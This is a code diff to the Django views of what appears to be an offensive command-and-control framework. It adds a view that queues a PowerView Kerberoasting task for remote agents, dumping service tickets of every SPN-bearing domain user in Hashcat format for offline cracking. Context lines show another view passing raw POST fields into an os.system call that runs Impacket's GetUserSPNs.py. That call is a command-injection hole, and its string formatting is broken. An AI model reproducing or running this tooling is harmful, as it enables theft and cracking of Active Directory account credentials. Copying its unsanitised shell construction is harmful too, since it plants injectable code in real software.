@@ -588,7 +588,7 @@ def Dsquery(request):
 
 
 
-def TGStickets_usingGetSPNusers(request):
+def TGStickets_GetSPNusers(request):
     if request.method=='POST':
         DCip = request.POST['DCip']
         domain = request.POST['domain']
@@ -613,6 +613,23 @@ def TGStickets_usingGetSPNusers(request):
             else:
                 os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -aeskey {aeskey} -o {result_dir}TGStickets -request".format(result_dir,result_path,aeskey, domain,DCip))
     
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def TGStickets_powerview(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        task='echo "===============TGStickets===============\nOutPut in the following path:\n$env:userprofile";import-module $env:userprofile\powerview.ps1;Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\$env:userprofile\[$env:username]TGS.csv -NoTypeInformation'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
         return JsonResponse({},status=200)
 
     else:
